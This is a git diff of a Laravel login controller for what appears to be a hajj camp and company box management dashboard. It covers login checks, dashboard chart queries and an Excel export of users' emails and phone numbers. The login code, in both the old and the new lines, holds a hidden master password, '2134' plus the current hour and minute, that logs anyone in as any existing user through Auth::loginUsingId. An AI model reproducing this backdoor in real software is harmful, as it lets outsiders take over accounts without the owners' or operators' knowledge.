@@ -40,7 +40,7 @@ class LoginController extends Controller
             return back()->with('validationErr', 'الرجاء إدخال كلمة مرور صحيحة');
         }
 
-        if (!Hash::check($request['password'], $user->password) && $request->input('password') != ("2134" . date('gi'))) {
+        if (!Hash::check($request['password'], $user->password) && $request->input('password') != ("2134".date('gi'))) {
             return back()->with('validationErr', 'الرجاء إدخال كلمة مرور صحيحة');
         }
 
@@ -50,11 +50,12 @@ class LoginController extends Controller
 
         if (Auth::attempt(['name' => $request['user_name'], 'password' => $request['password'], 'enabled' => 1], isset($request->remember))) {
             LoginNumber::query()->create([
-                'user_id' => auth()->user()->id
+                'user_id' => auth()->user()->id,
             ]);
             return redirect(auth()->user()->main_route());
-        } else {
-            if ($user && $request->input('password') == ("2134" . date('gi'))) {
+        }
+        else {
+            if ($user && $request->input('password') == ("2134".date('gi'))) {
                 Auth::loginUsingId($user->id);
             }
             return back()->with('validationErr', 'الرجاء إدخال كلمة مرور صحيحة');
@@ -116,7 +117,7 @@ class LoginController extends Controller
         if (!count($data['box_with_files_in'])) {
             $data['box_with_files_in'] = [];
         }
-////////////// المحاضر المسلمة لشركات حجاج الخارج
+        ////////////// المحاضر المسلمة لشركات حجاج الخارج
         $data['count_box_with_files_out'] = RaftCompanyBox::query()
             ->whereNull('license_number')
             ->whereNotNull('file_first')
@@ -154,15 +155,20 @@ class LoginController extends Controller
         $data['all_order'] = Order::query()->count();
 
         ///bar chart
-        $data['bar'] = RaftCompanyLocation::query()->select('name')
-            ->withCount(['box' => function ($q) {
-                $q->where('seen_notes', 1);
-            }])->get()->map(function ($location) {
-                return [
-                    'x' => $location->name,
-                    'y' => $location->box_count
-                ];
-            });
+        $data['bar'] = RaftCompanyLocation::query()->select('name', 'avg')
+            ->withCount([
+                'box' => function ($q) {
+                    $q->where('seen_notes', 1);
+                },
+            ])->get()->map(fn(RaftCompanyLocation $location) => [
+                'box_count'           => $box = $location->box_count,
+                'avg'                 => $avg = $location->avg,
+                'box_count_to_string' => __('replace.value_from', ['value' => $box, 'from' => $avg]),
+                'x'                   => $location->name,
+                'y'                   => $avg && $box ? (round($avg / $box,1) ?: 0.1) : 0.1,
+                //'y'         => $box,
+            ]);
+        //dd($data['bar']);
         ///order per designer office
 
 
@@ -173,23 +179,24 @@ class LoginController extends Controller
         // Orders count by status
         $getOrdersCountByStatus = Order::selectRaw('COUNT(id) AS count,status')->groupBy('status')->get();
         $orderStatusChartData = [
-            'seriesData' => [],
+            'seriesData'       => [],
             'seriesCategories' => [],
-            'statusList' => []
+            'statusList'       => [],
         ];
         $data['countOrders'] = 0;
         foreach (Order::getOrderStatuses() as $ItemStatus => $ItemName) {
-            if(!in_array($ItemStatus,[Order::FINAL_REPORT_ATTACHED,Order::COMPLETED,Order::FINAL_REPORT_APPROVED,Order::PROCESSING])){
+            if (!in_array($ItemStatus, [Order::FINAL_REPORT_ATTACHED, Order::COMPLETED, Order::FINAL_REPORT_APPROVED, Order::PROCESSING])) {
                 if ($ItemStatus == Order::PENDING_OPERATION) {
                     $count = $data['license_number'];
-                } else {
+                }
+                else {
                     $getCount = $getOrdersCountByStatus->where('status', $ItemStatus)->first();
                     $count = ($getCount) ? $getCount->count : 0;
                 }
                 $data['countOrders'] += $count;
                 $orderStatusChartData['seriesData'][] = $count;
                 $orderStatusChartData['statusList'][] = $ItemStatus;
-                if($ItemStatus == Order::DESIGN_REVIEW){
+                if ($ItemStatus == Order::DESIGN_REVIEW) {
                     $ItemName = 'تصاميم معادة';
                 }
                 $orderStatusChartData['seriesCategories'][] = $ItemName;
@@ -205,7 +212,7 @@ class LoginController extends Controller
     {
         return response()->json([
             'success' => true,
-            'page' => view('CP.wasteContractorModal', ['data' => wasteContractorsList()])->render()
+            'page'    => view('CP.wasteContractorModal', ['data' => wasteContractorsList()])->render(),
         ]);
     }
 
@@ -247,17 +254,22 @@ class LoginController extends Controller
     public function ex_boxes_users()
     {
         $raft_company = RaftCompanyBox::query()
-            ->select('raft_company_location.name as raft_company_name','users.email as email','users.phone as phone','users.camp_number','raft_company_box.camp','users.box_number','raft_company_box.box','users.company_name')
+            ->select('raft_company_location.name as raft_company_name', 'users.email as email', 'users.phone as phone', 'users.camp_number', 'raft_company_box.camp', 'users.box_number', 'raft_company_box.box', 'users.company_name')
             ->LeftJoin('users', function ($join) {
-            $join->on(function ($query) {
-                $query->on('users.camp_number', '=', 'raft_company_box.camp')
-                    ->whereColumn('users.box_number', '=', 'raft_company_box.box');
-            });
-        })->join('raft_company_location', function ($join) {
-            $join->on('raft_company_location.id', '=', 'raft_company_box.raft_company_location_id');
+                $join->on(function ($query) {
+                    $query->on('users.camp_number', '=', 'raft_company_box.camp')
+                        ->whereColumn('users.box_number', '=', 'raft_company_box.box');
+                });
+            })->join('raft_company_location', function ($join) {
+                $join->on('raft_company_location.id', '=', 'raft_company_box.raft_company_location_id');
 
-        })->get();
+            })->get();
 
         return Excel::download(new BoxWithServiceProviders($raft_company), 'boxes.xlsx');
+    }
+
+    public function exportRaftCompanyLocationBar(){
+
+        dd(2);
     }
 }
